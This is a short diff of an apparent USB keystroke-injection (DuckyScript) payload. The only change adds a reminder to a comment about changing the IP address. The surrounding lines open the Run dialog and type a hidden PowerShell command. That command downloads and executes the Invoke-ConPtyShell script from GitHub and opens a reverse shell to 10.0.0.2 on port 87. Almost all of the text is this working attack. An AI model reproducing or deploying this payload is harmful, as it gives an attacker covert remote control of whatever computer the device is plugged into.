@@ -19,7 +19,7 @@ ALT y
 DELAY 1000
 GUI r
 DELAY 100
-REM execute powershell command to start reverse shell script
+REM execute powershell command to start reverse shell script [don't forget to change IP]
 STRING powershell -w hidden "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 87"
 ENTER
 STRING exit
